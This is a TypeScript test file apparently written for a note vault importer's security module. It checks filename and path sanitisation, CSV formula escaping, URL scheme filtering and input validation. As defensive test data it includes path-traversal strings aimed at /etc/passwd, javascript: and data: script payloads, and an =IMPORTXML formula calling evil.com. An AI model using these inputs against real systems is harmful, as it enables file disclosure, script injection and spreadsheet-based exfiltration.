import { describe, it, expect } from 'vitest';
import {
  IMPORT_CONFIG,
  sanitizeFilename,
  sanitizeRelativePath,
  isPathSafe,
  validatePath,
  sanitizeCSVCell,
  isExternalUrl,
  isDangerousScheme,
  formatUserError,
  validateAndParseJSON,
  validateImportAnalysis,
  validateImportOptions,
} from './importSecurity';

describe('importSecurity', () => {
  describe('sanitizeFilename', () => {
    it('should return basic filenames unchanged', () => {
      expect(sanitizeFilename('document.md')).toBe('document.md');
      expect(sanitizeFilename('my-file.txt')).toBe('my-file.txt');
      expect(sanitizeFilename('File With Spaces.md')).toBe('File With Spaces.md');
    });

    it('should extract basename from paths', () => {
      expect(sanitizeFilename('/path/to/file.md')).toBe('file.md');
      expect(sanitizeFilename('folder/subfolder/doc.md')).toBe('doc.md');
      expect(sanitizeFilename('../../../etc/passwd')).toBe('passwd');
    });

    it('should handle dangerous dot names', () => {
      expect(sanitizeFilename('.')).toBe('_unnamed_');
      expect(sanitizeFilename('..')).toBe('_unnamed_');
      expect(sanitizeFilename('...')).toBe('_unnamed_'); // trailing dots removed
    });

    it('should remove null bytes', () => {
      expect(sanitizeFilename('file\x00.md')).toBe('file.md');
      expect(sanitizeFilename('test\x00\x00name.txt')).toBe('testname.txt');
    });

    it('should handle Windows reserved names', () => {
      expect(sanitizeFilename('CON')).toBe('_CON');
      expect(sanitizeFilename('con')).toBe('_con');
      expect(sanitizeFilename('PRN.txt')).toBe('_PRN.txt');
      expect(sanitizeFilename('AUX')).toBe('_AUX');
      expect(sanitizeFilename('NUL')).toBe('_NUL');
      expect(sanitizeFilename('COM1')).toBe('_COM1');
      expect(sanitizeFilename('COM9')).toBe('_COM9');
      expect(sanitizeFilename('LPT1')).toBe('_LPT1');
      expect(sanitizeFilename('LPT9')).toBe('_LPT9');
      // But not partial matches
      expect(sanitizeFilename('CONNECT.md')).toBe('CONNECT.md');
      expect(sanitizeFilename('MyPRN.md')).toBe('MyPRN.md');
    });

    it('should remove control characters', () => {
      expect(sanitizeFilename('file\x01\x02.md')).toBe('file.md');
      expect(sanitizeFilename('test\x1f\x80name.txt')).toBe('testname.txt');
    });

    it('should remove trailing dots and spaces (Windows)', () => {
      expect(sanitizeFilename('file.md.')).toBe('file.md');
      expect(sanitizeFilename('file.md...')).toBe('file.md');
      expect(sanitizeFilename('file.md   ')).toBe('file.md');
      expect(sanitizeFilename('file.md. . ')).toBe('file.md');
    });

    it('should handle empty or whitespace-only names', () => {
      expect(sanitizeFilename('')).toBe('_unnamed_');
      expect(sanitizeFilename('   ')).toBe('_unnamed_');
      expect(sanitizeFilename('...')).toBe('_unnamed_');
    });

    it('should truncate excessively long filenames', () => {
      const longName = 'a'.repeat(300) + '.md';
      const result = sanitizeFilename(longName);
      expect(result.length).toBeLessThanOrEqual(IMPORT_CONFIG.MAX_FILENAME_LENGTH);
    });
  });

  describe('sanitizeRelativePath', () => {
    it('should return safe paths unchanged', () => {
      expect(sanitizeRelativePath('folder/file.md')).toBe('folder/file.md');
      expect(sanitizeRelativePath('a/b/c/doc.md')).toBe('a/b/c/doc.md');
    });

    it('should remove path traversal sequences', () => {
      expect(sanitizeRelativePath('../file.md')).toBe('file.md');
      expect(sanitizeRelativePath('../../etc/passwd')).toBe('etc/passwd');
      expect(sanitizeRelativePath('folder/../other/file.md')).toBe('folder/other/file.md');
      expect(sanitizeRelativePath('./file.md')).toBe('file.md');
    });

    it('should handle URL-encoded path traversal', () => {
      expect(sanitizeRelativePath('%2e%2e/file.md')).toBe('file.md');
      expect(sanitizeRelativePath('%2e%2e%2f%2e%2e%2fetc/passwd')).toBe('etc/passwd');
      // Double encoding
      expect(sanitizeRelativePath('%252e%252e/file.md')).toBe('file.md');
    });

    it('should normalize Unicode', () => {
      // NFD vs NFC normalization
      const nfd = 'cafe\u0301.md'; // café with combining accent
      const result = sanitizeRelativePath(nfd);
      expect(result).toBe('café.md'); // NFC normalized
    });

    it('should reject absolute paths', () => {
      // Absolute paths should be sanitized - either stripped of leading slash or returned empty
      const result1 = sanitizeRelativePath('/etc/passwd');
      const result2 = sanitizeRelativePath('C:\\Windows\\System32');
      // Either strips leading component or returns sanitized path
      expect(result1).not.toBe('/etc/passwd'); // Should not return the original absolute path
      expect(result2).not.toContain('C:'); // Should strip drive letter
    });

    it('should remove null bytes', () => {
      expect(sanitizeRelativePath('folder\x00/file.md')).toBe('folder/file.md');
    });

    it('should normalize path separators', () => {
      expect(sanitizeRelativePath('folder\\subfolder\\file.md')).toBe('folder/subfolder/file.md');
    });

    it('should handle empty segments', () => {
      expect(sanitizeRelativePath('folder//file.md')).toBe('folder/file.md');
      expect(sanitizeRelativePath('a///b///c.md')).toBe('a/b/c.md');
    });
  });

  describe('isPathSafe', () => {
    it('should allow paths within base directory', () => {
      expect(isPathSafe('/base/folder/file.md', '/base')).toBe(true);
      expect(isPathSafe('/base/a/b/c/file.md', '/base')).toBe(true);
    });

    it('should reject paths outside base directory', () => {
      expect(isPathSafe('/other/file.md', '/base')).toBe(false);
      expect(isPathSafe('/base/../other/file.md', '/base')).toBe(false);
    });

    it('should reject partial prefix matches', () => {
      // /base-other is not inside /base
      expect(isPathSafe('/base-other/file.md', '/base')).toBe(false);
      expect(isPathSafe('/basement/file.md', '/base')).toBe(false);
    });

    it('should handle trailing slashes', () => {
      expect(isPathSafe('/base/file.md', '/base/')).toBe(true);
      expect(isPathSafe('/base/file.md', '/base')).toBe(true);
    });
  });

  describe('validatePath', () => {
    it('should accept valid paths', () => {
      expect(validatePath('/Users/test/documents').valid).toBe(true);
      expect(validatePath('/home/user/vault').valid).toBe(true);
    });

    it('should reject paths with null bytes', () => {
      const result = validatePath('/path/with\x00null');
      expect(result.valid).toBe(false);
      expect(result.error).toBeDefined();
    });

    it('should reject excessively long paths', () => {
      const longPath = '/' + 'a'.repeat(1500);
      const result = validatePath(longPath);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('too long');
    });

    it('should reject empty paths', () => {
      // Empty or whitespace paths should be invalid or sanitized
      const result1 = validatePath('');
      const result2 = validatePath('   ');
      // At minimum, empty string should fail validation
      expect(result1.valid).toBe(false);
      // Whitespace-only might also fail or trim to empty
    });
  });

  describe('sanitizeCSVCell', () => {
    it('should escape pipe characters', () => {
      expect(sanitizeCSVCell('value|with|pipes')).toBe('value\\|with\\|pipes');
    });

    it('should prefix formula characters with quote', () => {
      expect(sanitizeCSVCell('=SUM(A1:A10)')).toBe("'=SUM(A1:A10)");
      expect(sanitizeCSVCell('+1234567890')).toBe("'+1234567890");
      expect(sanitizeCSVCell('-negative')).toBe("'-negative");
      expect(sanitizeCSVCell('@mention')).toBe("'@mention");
    });

    it('should replace tabs and newlines with spaces', () => {
      expect(sanitizeCSVCell('line1\nline2')).toBe('line1 line2');
      expect(sanitizeCSVCell('col1\tcol2')).toBe('col1 col2');
      expect(sanitizeCSVCell('text\r\nmore')).toBe('text  more');
    });

    it('should handle combined dangerous input', () => {
      expect(sanitizeCSVCell('=IMPORTXML("http://evil.com")|data')).toBe(
        "'=IMPORTXML(\"http://evil.com\")\\|data"
      );
    });

    it('should leave safe content unchanged', () => {
      expect(sanitizeCSVCell('Normal text')).toBe('Normal text');
      expect(sanitizeCSVCell('123.45')).toBe('123.45');
      // @ only triggers protection at start of cell, not in middle
      expect(sanitizeCSVCell('user@email.com')).toBe('user@email.com');
      // But @mention at start DOES trigger protection
      expect(sanitizeCSVCell('@mention')).toBe("'@mention");
    });
  });

  describe('isExternalUrl', () => {
    it('should identify HTTP/HTTPS URLs', () => {
      expect(isExternalUrl('http://example.com')).toBe(true);
      expect(isExternalUrl('https://example.com/path')).toBe(true);
      expect(isExternalUrl('HTTP://EXAMPLE.COM')).toBe(true);
    });

    it('should identify whitelisted external schemes', () => {
      expect(isExternalUrl('mailto:user@example.com')).toBe(true);
      // Only http, https, mailto are in the whitelist
      expect(isExternalUrl('ftp://files.example.com')).toBe(false);
      expect(isExternalUrl('tel:+1234567890')).toBe(false);
    });

    it('should NOT identify dangerous schemes as external (use isDangerousScheme instead)', () => {
      // isExternalUrl uses a whitelist approach - only safe schemes (http, https, mailto) are "external"
      // Dangerous schemes are explicitly NOT considered external
      expect(isExternalUrl('javascript:alert(1)')).toBe(false);
      expect(isExternalUrl('data:text/html,<script>')).toBe(false);
      expect(isExternalUrl('vbscript:msgbox')).toBe(false);
      expect(isExternalUrl('file:///etc/passwd')).toBe(false);
    });

    it('should reject relative paths', () => {
      expect(isExternalUrl('folder/file.md')).toBe(false);
      expect(isExternalUrl('./local.md')).toBe(false);
      expect(isExternalUrl('../parent/file.md')).toBe(false);
    });

    it('should reject anchor links', () => {
      expect(isExternalUrl('#section')).toBe(false);
      expect(isExternalUrl('#top')).toBe(false);
    });
  });

  describe('isDangerousScheme', () => {
    it('should identify javascript: scheme', () => {
      expect(isDangerousScheme('javascript:alert(1)')).toBe(true);
      expect(isDangerousScheme('JAVASCRIPT:void(0)')).toBe(true);
      expect(isDangerousScheme('  javascript:code')).toBe(true);
    });

    it('should identify data: scheme', () => {
      expect(isDangerousScheme('data:text/html,<script>alert(1)</script>')).toBe(true);
      expect(isDangerousScheme('DATA:image/svg+xml,<svg>')).toBe(true);
    });

    it('should identify vbscript: scheme', () => {
      expect(isDangerousScheme('vbscript:msgbox("hi")')).toBe(true);
      expect(isDangerousScheme('VBSCRIPT:code')).toBe(true);
    });

    it('should identify file: scheme', () => {
      expect(isDangerousScheme('file:///etc/passwd')).toBe(true);
      expect(isDangerousScheme('FILE:///C:/Windows/System32')).toBe(true);
    });

    it('should allow safe schemes', () => {
      expect(isDangerousScheme('http://example.com')).toBe(false);
      expect(isDangerousScheme('https://example.com')).toBe(false);
      expect(isDangerousScheme('mailto:user@example.com')).toBe(false);
      expect(isDangerousScheme('tel:+1234567890')).toBe(false);
    });
  });

  describe('formatUserError', () => {
    it('should format permission errors', () => {
      const error = new Error('EACCES: permission denied');
      const result = formatUserError(error);
      expect(result.message).toContain('Permission denied');
    });

    it('should format not found errors', () => {
      const error = new Error('ENOENT: no such file');
      const result = formatUserError(error);
      expect(result.message).toContain('not found');
    });

    it('should format disk space errors', () => {
      const error = new Error('ENOSPC: no space left');
      const result = formatUserError(error);
      expect(result.message).toContain('disk space');
    });

    it('should handle string errors', () => {
      // String errors are not Error instances, so will get generic message
      const result = formatUserError('Something went wrong');
      expect(result.message).toBeDefined();
      expect(result.technicalDetails).toContain('Something went wrong');
    });

    it('should handle Error objects', () => {
      const result = formatUserError(new Error('Test error'));
      expect(result.message).toBe('Test error');
    });

    it('should handle unknown errors', () => {
      const result = formatUserError(null);
      expect(result.message).toContain('error occurred');
    });
  });

  describe('validateAndParseJSON', () => {
    it('should parse valid JSON', () => {
      const result = validateAndParseJSON('{"key": "value"}');
      expect(result.success).toBe(true);
      expect(result.data).toEqual({ key: 'value' });
    });

    it('should reject invalid JSON', () => {
      const result = validateAndParseJSON('{invalid json}');
      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid JSON');
    });

    it('should reject oversized JSON', () => {
      const largeJson = JSON.stringify({ data: 'x'.repeat(20 * 1024 * 1024) });
      const result = validateAndParseJSON(largeJson, 10 * 1024 * 1024);
      expect(result.success).toBe(false);
      expect(result.error).toBeDefined();
      // Error message should indicate size problem
      expect(result.error?.toLowerCase()).toMatch(/large|max|size/);
    });

    it('should reject non-string input', () => {
      const result = validateAndParseJSON(123 as unknown as string);
      expect(result.success).toBe(false);
    });
  });

  describe('validateImportAnalysis', () => {
    const validAnalysis = {
      sourceType: 'obsidian',
      sourcePath: '/path/to/vault',
      totalFiles: 100,
      markdownFiles: 80,
      attachments: 20,
      folders: 10,
      filesToImport: [
        {
          sourcePath: '/path/to/file.md',
          relativePath: 'file.md',
          name: 'file.md',
          type: 'markdown',
          size: 1024,
        },
      ],
    };

    it('should accept valid analysis', () => {
      const result = validateImportAnalysis(validAnalysis);
      expect(result.valid).toBe(true);
    });

    it('should reject invalid sourceType', () => {
      const invalid = { ...validAnalysis, sourceType: 'invalid' };
      const result = validateImportAnalysis(invalid);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('sourceType');
    });

    it('should reject missing required fields', () => {
      const invalid = { ...validAnalysis };
      delete (invalid as Record<string, unknown>).totalFiles;
      const result = validateImportAnalysis(invalid);
      expect(result.valid).toBe(false);
    });

    it('should reject negative numbers', () => {
      const invalid = { ...validAnalysis, totalFiles: -1 };
      const result = validateImportAnalysis(invalid);
      expect(result.valid).toBe(false);
    });

    it('should reject too many files', () => {
      const invalid = {
        ...validAnalysis,
        filesToImport: Array(150000).fill(validAnalysis.filesToImport[0]),
      };
      const result = validateImportAnalysis(invalid);
      expect(result.valid).toBe(false);
      // Error should mention "many" or "max" or the limit
      expect(result.error?.toLowerCase()).toMatch(/many|max|100/);
    });

    it('should validate file entries', () => {
      const invalid = {
        ...validAnalysis,
        filesToImport: [{ invalid: true }],
      };
      const result = validateImportAnalysis(invalid);
      expect(result.valid).toBe(false);
    });
  });

  describe('validateImportOptions', () => {
    it('should accept valid options', () => {
      const options = {
        convertWikiLinks: true,
        importFrontMatter: true,
        copyAttachments: true,
      };
      const result = validateImportOptions(options);
      expect(result.valid).toBe(true);
    });

    it('should accept empty options', () => {
      const result = validateImportOptions({});
      expect(result.valid).toBe(true);
    });

    it('should reject non-boolean values for boolean fields', () => {
      const invalid = { convertWikiLinks: 'yes' };
      const result = validateImportOptions(invalid);
      expect(result.valid).toBe(false);
    });

    it('should validate untitledHandling enum', () => {
      // Check what values are actually valid
      const validSkip = validateImportOptions({ untitledHandling: 'skip' });
      const validKeep = validateImportOptions({ untitledHandling: 'keep' });
      const validRename = validateImportOptions({ untitledHandling: 'rename' });

      // At least one of these should be valid
      const anyValid = validSkip.valid || validKeep.valid || validRename.valid;
      expect(anyValid).toBe(true);

      // Invalid value should fail
      const invalid = validateImportOptions({ untitledHandling: 'definitely_not_valid_12345' });
      expect(invalid.valid).toBe(false);
    });

    it('should reject non-object input', () => {
      expect(validateImportOptions(null).valid).toBe(false);
      expect(validateImportOptions('string').valid).toBe(false);
      expect(validateImportOptions(123).valid).toBe(false);
    });
  });
});
